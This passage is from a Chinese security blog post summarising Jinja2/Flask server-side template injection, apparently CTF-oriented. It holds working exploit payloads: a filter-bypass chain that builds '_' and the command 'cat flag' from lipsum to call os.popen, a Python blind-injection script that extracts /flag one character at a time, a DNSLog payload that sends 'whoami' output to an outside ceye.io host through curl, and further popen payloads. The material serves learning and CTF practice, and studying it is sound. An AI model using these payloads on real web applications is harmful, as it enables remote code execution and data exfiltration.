nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count%&#125;</span><br></pre></td></tr></table></figure>
+<p>然后查看<code>_</code>在第几个，这里是下标18为下划线</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set eighteen&#x3D;nine+nine %&#125;</span><br><span class="line">&#123;&#123;(lipsum|string|list)|attr(pop)(eighteen)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里问题来了，<code>attr()</code>里面要求的是字符串，直接输pop需要用引号<code>&#39;&#39;</code>包围起来，但是这里又过滤了引号，所以要先构造一个<code>pop</code>字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pop&#x3D;dict(pop&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><br></pre></td></tr></table></figure>
+<p>此时就能成功取到<code>_</code>，再用下划线去构造其他的类：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set globals&#x3D;(xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem&#x3D;(xiahuaxian,xiahuaxian,dict(getitem&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br></pre></td></tr></table></figure>
+<p>再去构造后面用到的方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set space&#x3D;(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% set os&#x3D;dict(os&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set popen&#x3D;dict(popen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cat&#x3D;dict(cat&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cmd&#x3D;(cat,space,dict(flag&#x3D;a)|join)|join%&#125;</span><br><span class="line">&#123;% set read&#x3D;dict(read&#x3D;a)|join%&#125;</span><br></pre></td></tr></table></figure>
+<p>最后就是完整的利用语法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>合在一起就是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set nine&#x3D;dict(aaaaaaaaa&#x3D;a)|join|count %&#125;</span><br><span class="line">&#123;% set eighteen&#x3D;nine+nine %&#125;</span><br><span class="line">&#123;% set pop&#x3D;dict(pop&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set xiahuaxian&#x3D;(lipsum|string|list)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;% set globals&#x3D;(xiahuaxian,xiahuaxian,dict(globals&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set getitem&#x3D;(xiahuaxian,xiahuaxian,dict(getitem&#x3D;a)|join,xiahuaxian,xiahuaxian)|join %&#125;</span><br><span class="line">&#123;% set space&#x3D;(lipsum|string|list)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;% set os&#x3D;dict(os&#x3D;a)|join %&#125;</span><br><span class="line">&#123;% set popen&#x3D;dict(popen&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cat&#x3D;dict(cat&#x3D;a)|join%&#125;</span><br><span class="line">&#123;% set cmd&#x3D;(cat,space,dict(flag&#x3D;a)|join)|join%&#125;</span><br><span class="line">&#123;% set read&#x3D;dict(read&#x3D;a)|join%&#125;</span><br><span class="line">&#123;&#123;(lipsum|attr(globals))|attr(getitem)(os)|attr(popen)(cmd)|attr(read)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:5000/?name=&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.get(url+payload).content</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;kawhi&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">s = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;$\&#x27;()*+,-./:;&lt;=&gt;?@[\\]^`&#123;|&#125;~\&#x27;&quot;_%&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">&#x27;&#123;% if ().__class__.__bases__[0].__subclasses__()[80].__init__.__globals__.__builtins__.open(&quot;/flag&quot;).read()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>)+<span class="string">&#x27;] == &quot;&#x27;</span>+c+<span class="string">&#x27;&quot; %&#125;kawhi&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span> password</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426201503227.png" alt="image-20210426201503227"></p>
+<h4 id="DNSLog外带数据"><a href="#DNSLog外带数据" class="headerlink" title="DNSLog外带数据"></a>DNSLog外带数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#39;popen&#39;](&quot;curl &#96;whoami&#96;.t6n089.ceye.io&quot;).read()&#x3D;&#x3D;&#39;ssti&#39; %&#125;1&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210426201845448.png" alt="image-20210426201845448"></p>
+<br/>
+
+<h3 id="其他payload"><a href="#其他payload" class="headerlink" title="其他payload"></a>其他payload</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[][request[&#39;args&#39;][&#39;class&#39;]][request[&#39;args&#39;][&#39;base&#39;]][request[&#39;args&#39;][&#39;subclasses&#39;]]()[153][request[&#39;args&#39;][&#39;dict&#39;]][request[&#39;args&#39;][&#39;init&#39;]][request[&#39;args&#39;][&#39;globals&#39;]][request[&#39;args&#39;][&#39;builtins&#39;]][&#39;eval&#39;](request[&#39;args&#39;][&#39;payload&#39;])&#125;&#125;?base&#x3D;__base__&amp;subclasses&#x3D;__subclasses__&amp;dict&#x3D;__dict__&amp;init&#x3D;__init__&amp;globals&#x3D;__globals__&amp;builtins&#x3D;__builtins__&amp;class&#x3D;__class__&amp;payload&#x3D;__import__(%27os%27).popen(%27ls%20&#x2F;%27).read()</span><br><span class="line"></span><br><span class="line">#一句cat flag</span><br><span class="line">&#123;% for i in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if i.__name__&#x3D;&#x3D;&#39;Popen&#39; %&#125;&#123;&#123; i.__init__.__globals__[&#39;os&#39;].popen(&#39;cat flag&#39;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+<br/>
+
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226544#h3-7" >详解模板注入漏洞（上）<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3679" >flask之ssti模版注入从零到入门<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6885#toc-4" >Python模板注入(SSTI)深入学习<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html" >1. SSTI（模板注入）漏洞（入门篇）<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/110220425" >SSTI模板注入绕过（进阶篇）<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://ca01h.top/Python/pysec/1.Jinja2%E7%9A%84SSTI+Bypass/#jinja2-SSTI-Bypass" >jinja2 SSTI &amp; Bypass<i class="fas fa-external-link-alt"></i></a></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：模板注入总结</li>
+        <li>Post author：John_Frod</li>
+        <li>Create time：2021-05-06 16:55:21</li>
+        <li>
+            Post link：https://keep.xpoet.cn/2021/05/06/模板注入总结/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <div class="article-nav">
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/05/06/Flask-SSTI-LAB%E6%94%BB%E7%95%A5/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Flask SSTI LAB攻略</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center" >
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                    
+                </main>
+
+            </div>
+
+            <div class="page-main-content-bottom">
+                <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2020</span> -
+            
+            2021 <i class="fas fa-heart icon-animate"></i> <a href="/">John_Frod</a>
+        </div>
+        
+            <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count <span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a> | Theme <a class="theme-version" target="_blank"></a>
+        </div>
+    </div>
+</footer>
+
+            </div>
+        </div>
+    </main>
+
+    <div class="sidebar-tools">
+        <div class="tools-container">
+    <ul class="tools-list">
+        
+            <li class="search popup-trigger">
+                <i class="fas fa-search"></i>
+            </li>
+        
+
+        
+
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+    </ul>
+</div>
+
+    </div>
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        <li class="tools-item tool-scroll-to-top flex-center">
+            <i class="fas fa-arrow-up"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="tools-ul-1">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+    </ul>
+</div>
+
+    </div>
+
+    <!-- page aside -->
+    <aside class="page-aside">
+        
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93"><span class="nav-text">模板注入总结</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-text">介绍</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="nav-text">模板引擎</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-text">原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E6%9D%BF%E7%B1%BB%E5%9E%8B"><span class="nav-text">判断模板类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="nav-text">flask模板注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84%E5%86%85%E5%BB%BA%E5%B1%9E%E6%80%A7"><span class="nav-text">常用的内建属性</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#class"><span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#base"><span class="nav-text">__base__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#bases"><span class="nav-text">__bases__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#mro"><span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#subclasses"><span class="nav-text">__subclasses__()</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dict"><span class="nav-text">__dict__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#init"><span class="nav-text">__init__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#global"><span class="nav-text">__global__</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#getitem"><span class="nav-text">__getitem__</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins%E3%80%81-builtin-%E3%80%81-builtins-%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">builtins、__builtin__、__builtins__的区别</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="nav-text">过滤器</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#attr"><span class="nav-text">attr</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#format"><span class="nav-text">format</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#first-last-random"><span class="nav-text">first last random</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#join"><span class="nav-text">join</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lower"><span class="nav-text">lower</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#replace-reverse"><span class="nav-text">replace reverse</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#string"><span class="nav-text">string</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#select-unique"><span class="nav-text">select unique</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#list"><span class="nav-text">list</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-text">环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#route%E8%A3%85%E9%A5%B0%E5%99%A8%E8%B7%AF%E7%94%B1"><span class="nav-text">route装饰器路由</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#debug%E6%A8%A1%E5%BC%8F"><span class="nav-text">debug模式</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="nav-text">模板渲染</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E6%B3%A8%E5%85%A5"><span class="nav-text">检测注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">利用思路</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5"><span class="nav-text">第一步</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5"><span class="nav-text">第二步</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5"><span class="nav-text">第三步</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E5%9B%9B%E6%AD%A5"><span class="nav-text">第四步</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%94%E6%AD%A5"><span class="nav-text">第五步</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E7%B1%BB%E6%88%96%E5%87%BD%E6%95%B0"><span class="nav-text">可以利用的类或函数</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#config"><span class="nav-text">config</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#env"><span class="nav-text">env</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#popen"><span class="nav-text">popen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subprocess-Popen"><span class="nav-text">subprocess.Popen</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import-%E4%B8%AD%E7%9A%84os"><span class="nav-text">__import__中的os</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">__builtins__代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#request"><span class="nav-text">request</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#url-for"><span class="nav-text">url_for</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get-flashed-messages"><span class="nav-text">get_flashed_messages</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#lipsum"><span class="nav-text">lipsum</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4"><span class="nav-text">过滤.</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%BB%95%E8%BF%87-1"><span class="nav-text">[]绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#attr-%E7%BB%95%E8%BF%87"><span class="nav-text">attr()绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤引号</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#request%E7%BB%95%E8%BF%87"><span class="nav-text">request绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#chr-%E7%BB%95%E8%BF%87"><span class="nav-text">chr()绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="nav-text">过滤()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="nav-text">过滤_</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">十六进制编码绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">Unicode编码绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">base64编码绕过</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-text">过滤关键字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E3%80%81%E5%A4%A7%E5%B0%8F%E5%86%99"><span class="nav-text">双写、大小写</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="nav-text">拼接字符</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9B%BF%E4%BB%A3%E6%96%B9%E6%B3%95"><span class="nav-text">替代方法</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-3"><span class="nav-text">过滤[]</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%B4%A2%E5%BC%95%E4%B8%AD%E7%9A%84"><span class="nav-text">索引中的[]</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E4%B8%AD%E7%9A%84"><span class="nav-text">魔术方法中的[]</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-4"><span class="nav-text">过滤&amp;#123;&amp;#125;</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#DNSLOG%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="nav-text">DNSLOG外带数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#print%E6%A0%87%E8%AE%B0"><span class="nav-text">print标记</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%95%B0%E5%AD%97"><span class="nav-text">过滤数字</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8%E5%BE%AA%E7%8E%AF%E6%89%BE%E5%88%B0%E8%83%BD%E5%88%A9%E7%94%A8%E7%9A%84%E7%B1%BB%E7%9B%B4%E6%8E%A5%E7%94%A8"><span class="nav-text">用循环找到能利用的类直接用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%94%A8lipsum%E4%B8%8D%E9%80%9A%E8%BF%87%E6%95%B0%E5%AD%97%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8"><span class="nav-text">用lipsum不通过数字直接利用</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97%E8%BF%9B%E8%A1%8C%E6%8B%BC%E6%8E%A5"><span class="nav-text">构造数字进行拼接</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%9E%8D%E5%90%88%E6%80%AA"><span class="nav-text">融合怪</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%B2%E6%B3%A8"><span class="nav-text">盲注</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC"><span class="nav-text">脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#DNSLog%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE"><span class="nav-text">DNSLog外带数据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96payload"><span class="nav-text">其他payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
